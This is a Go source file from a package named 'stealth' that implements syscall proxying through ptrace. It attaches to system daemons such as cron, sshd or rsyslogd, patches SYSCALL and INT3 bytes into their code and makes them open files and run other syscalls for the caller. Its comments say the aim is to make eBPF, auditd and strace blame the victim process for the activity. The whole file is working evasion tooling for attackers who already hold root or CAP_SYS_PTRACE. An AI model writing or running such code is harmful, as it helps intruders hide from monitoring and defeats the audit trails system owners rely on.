package stealth

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"syscall"
)

// Syscall Proxying
//
// OPSEC rationale: eBPF tracing, auditd, and strace all attribute syscalls to
// the calling PID. If our PID makes execve, connect, or open calls, they're
// logged against us. By injecting a tiny stub into a legitimate process and
// having IT make syscalls on our behalf, the audit trail points to sshd or
// cron — not to us.
//
// This uses ptrace to inject syscalls into a target process.
// Requires CAP_SYS_PTRACE or root.

// SyscallProxy represents a connection to a target process for proxied syscalls.
type SyscallProxy struct {
	TargetPID int
	Attached  bool
}

// NewSyscallProxy attaches to a target process via ptrace.
func NewSyscallProxy(targetPID int) (*SyscallProxy, error) {
	proxy := &SyscallProxy{
		TargetPID: targetPID,
	}

	// Attach to target
	if err := syscall.PtraceAttach(targetPID); err != nil {
		return nil, fmt.Errorf("ptrace attach to %d: %w", targetPID, err)
	}

	// Wait for the target to stop
	var ws syscall.WaitStatus
	_, err := syscall.Wait4(targetPID, &ws, 0, nil)
	if err != nil {
		syscall.PtraceDetach(targetPID)
		return nil, fmt.Errorf("wait for stop: %w", err)
	}

	proxy.Attached = true
	return proxy, nil
}

// Detach releases the target process.
func (sp *SyscallProxy) Detach() error {
	if !sp.Attached {
		return nil
	}
	sp.Attached = false
	return syscall.PtraceDetach(sp.TargetPID)
}

// InjectSyscall makes the target process execute a syscall on our behalf.
// The target's registers are saved, modified to execute our syscall,
// then restored. The target never knows it happened.
func (sp *SyscallProxy) InjectSyscall(sysno uintptr, args [6]uintptr) (uintptr, error) {
	if !sp.Attached {
		return 0, fmt.Errorf("not attached")
	}

	// Save original registers
	var origRegs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(sp.TargetPID, &origRegs); err != nil {
		return 0, fmt.Errorf("get regs: %w", err)
	}

	// Modify registers for our syscall (x86_64 ABI)
	newRegs := origRegs
	newRegs.Orig_rax = uint64(sysno)
	newRegs.Rax = uint64(sysno)
	newRegs.Rdi = uint64(args[0])
	newRegs.Rsi = uint64(args[1])
	newRegs.Rdx = uint64(args[2])
	newRegs.R10 = uint64(args[3])
	newRegs.R8 = uint64(args[4])
	newRegs.R9 = uint64(args[5])

	// Find a safe place to inject — use the current RIP
	// We'll inject a SYSCALL instruction (0x0F 0x05) at the current IP

	// Read the original bytes at RIP (3 bytes: SYSCALL + INT3 trap)
	var origBytes [8]byte // PtracePeekData reads word-sized chunks
	origBytesSlice := origBytes[:]
	count, err := syscall.PtracePeekData(sp.TargetPID, uintptr(origRegs.Rip), origBytesSlice)
	if err != nil || count < 3 {
		return 0, fmt.Errorf("peek data: %w", err)
	}

	// Write SYSCALL (0x0F 0x05) + INT3 (0xCC) at RIP.
	// INT3 acts as a trap after the syscall returns to userspace — this is
	// required because PtraceSingleStep cannot step over SYSCALL (the TF flag
	// is cleared by SYSCALL's transition to kernel mode).
	patchBytes := make([]byte, len(origBytesSlice))
	copy(patchBytes, origBytesSlice)
	patchBytes[0] = 0x0F // SYSCALL byte 1
	patchBytes[1] = 0x05 // SYSCALL byte 2
	patchBytes[2] = 0xCC // INT3 — trap after syscall returns
	_, err = syscall.PtracePokeData(sp.TargetPID, uintptr(origRegs.Rip), patchBytes)
	if err != nil {
		return 0, fmt.Errorf("poke syscall: %w", err)
	}

	// Set the modified registers
	if err := syscall.PtraceSetRegs(sp.TargetPID, &newRegs); err != nil {
		syscall.PtracePokeData(sp.TargetPID, uintptr(origRegs.Rip), origBytesSlice)
		return 0, fmt.Errorf("set regs: %w", err)
	}

	// Continue execution — process hits SYSCALL, enters kernel, returns,
	// then hits INT3 and stops with SIGTRAP.
	if err := syscall.PtraceCont(sp.TargetPID, 0); err != nil {
		syscall.PtracePokeData(sp.TargetPID, uintptr(origRegs.Rip), origBytesSlice)
		syscall.PtraceSetRegs(sp.TargetPID, &origRegs)
		return 0, fmt.Errorf("ptrace cont: %w", err)
	}

	// Wait for the INT3 trap after syscall completion.
	// Must handle the case where a different signal arrives before INT3.
	var ws syscall.WaitStatus
	for retries := 0; retries < 10; retries++ {
		if _, err := syscall.Wait4(sp.TargetPID, &ws, 0, nil); err != nil {
			// Wait failed — restore and bail
			syscall.PtracePokeData(sp.TargetPID, uintptr(origRegs.Rip), origBytesSlice)
			syscall.PtraceSetRegs(sp.TargetPID, &origRegs)
			syscall.PtraceCont(sp.TargetPID, 0)
			return 0, fmt.Errorf("wait4: %w", err)
		}

		if ws.Stopped() && ws.StopSignal() == syscall.SIGTRAP {
			break // Got our INT3 trap
		}

		if ws.Exited() || ws.Signaled() {
			// Target died — cannot restore
			return 0, fmt.Errorf("target exited during syscall injection")
		}

		// Non-SIGTRAP signal — re-deliver it and continue waiting for INT3
		syscall.PtraceCont(sp.TargetPID, int(ws.StopSignal()))
	}

	// Read the result from RAX
	var resultRegs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(sp.TargetPID, &resultRegs); err != nil {
		syscall.PtracePokeData(sp.TargetPID, uintptr(origRegs.Rip), origBytesSlice)
		syscall.PtraceSetRegs(sp.TargetPID, &origRegs)
		syscall.PtraceCont(sp.TargetPID, 0)
		return 0, fmt.Errorf("get result regs: %w", err)
	}
	result := uintptr(resultRegs.Rax)

	// Restore original bytes and registers — check errors
	if _, err := syscall.PtracePokeData(sp.TargetPID, uintptr(origRegs.Rip), origBytesSlice); err != nil {
		// Code patch stuck — kill target to prevent corruption from being visible
		syscall.Kill(sp.TargetPID, syscall.SIGKILL)
		sp.Attached = false
		return 0, fmt.Errorf("restore code failed, target killed: %w", err)
	}
	if err := syscall.PtraceSetRegs(sp.TargetPID, &origRegs); err != nil {
		syscall.Kill(sp.TargetPID, syscall.SIGKILL)
		sp.Attached = false
		return 0, fmt.Errorf("restore regs failed, target killed: %w", err)
	}

	// Continue the target process
	syscall.PtraceCont(sp.TargetPID, 0)

	return result, nil
}

// ProxiedOpen makes the target process open a file for us.
// Returns the fd number in the TARGET's fd table.
func (sp *SyscallProxy) ProxiedOpen(path string, flags int, mode uint32) (int, error) {
	// Write the path string into the target's memory
	pathAddr, err := sp.writeString(path)
	if err != nil {
		return -1, err
	}

	// openat(2) signature: openat(int dirfd, const char *path, int flags, mode_t mode)
	// AT_FDCWD (-100) means resolve relative to cwd
	args := [6]uintptr{
		^uintptr(99), // AT_FDCWD = -100
		pathAddr,
		uintptr(flags),
		uintptr(mode),
	}

	result, err := sp.InjectSyscall(syscall.SYS_OPENAT, args)
	if err != nil {
		return -1, err
	}

	return int(result), nil
}

// ProxiedConnect makes the target process connect a socket for us.
func (sp *SyscallProxy) ProxiedConnect(fd int, addr syscall.Sockaddr) error {
	// This is simplified — full implementation would serialize sockaddr
	// into target memory space
	return fmt.Errorf("connect proxy requires sockaddr serialization — use InjectSyscall directly")
}

// writeString writes a string into the target process's stack space.
// Writes below the x86_64 red zone (128 bytes below RSP) to avoid
// corrupting data used by leaf functions in the target process.
func (sp *SyscallProxy) writeString(s string) (uintptr, error) {
	data := append([]byte(s), 0) // null terminate

	// Safety check: don't write excessively long strings to the stack
	if len(data) > 4096 {
		return 0, fmt.Errorf("string too long for stack write: %d bytes", len(data))
	}

	var regs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(sp.TargetPID, &regs); err != nil {
		return 0, err
	}

	// Write below the red zone (128 bytes) plus padding.
	// Place data at RSP - 128 (red zone) - len(data) - 64 (extra margin).
	addr := uintptr(regs.Rsp) - 128 - uintptr(len(data)) - 64

	_, err := syscall.PtracePokeData(sp.TargetPID, addr, data)
	if err != nil {
		return 0, fmt.Errorf("write string: %w", err)
	}

	return addr, nil
}

// FindProxyTarget finds a suitable long-lived process to proxy through.
// Prefers processes that already make the types of syscalls we need.
func FindProxyTarget(preferredName string) (int, error) {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return 0, err
	}

	// First pass: look for preferred process
	for _, entry := range entries {
		pid, err := strconv.Atoi(entry.Name())
		if err != nil || pid <= 2 || pid == os.Getpid() {
			continue
		}

		comm, err := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid))
		if err != nil {
			continue
		}

		if strings.TrimSpace(string(comm)) == preferredName {
			// Verify it's ptraceable
			if isPtraceable(pid) {
				return pid, nil
			}
		}
	}

	// Second pass: any long-lived daemon
	daemonNames := []string{"cron", "atd", "dbus-daemon", "rsyslogd", "systemd-logind"}
	for _, name := range daemonNames {
		for _, entry := range entries {
			pid, err := strconv.Atoi(entry.Name())
			if err != nil || pid <= 2 {
				continue
			}

			comm, err := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid))
			if err != nil {
				continue
			}

			if strings.TrimSpace(string(comm)) == name && isPtraceable(pid) {
				return pid, nil
			}
		}
	}

	return 0, fmt.Errorf("no suitable proxy target found")
}

// isPtraceable checks if we can attach to a process without actually stopping it.
// Reads /proc/[pid]/status to check TracerPid (if 0, no tracer is attached)
// and Yama ptrace scope to determine if ptrace would be allowed.
func isPtraceable(pid int) bool {
	// Check if another tracer is already attached
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return false
	}

	statusStr := string(data)
	for _, line := range strings.Split(statusStr, "\n") {
		if strings.HasPrefix(line, "TracerPid:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 && fields[1] != "0" {
				return false // already being traced
			}
		}
	}

	// Check Yama ptrace scope — if > 0, only parent can trace
	yamaData, err := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope")
	if err == nil {
		scope := strings.TrimSpace(string(yamaData))
		if scope != "0" {
			// Restricted — only works if we're root
			if os.Getuid() != 0 {
				return false
			}
		}
	}

	return true
}
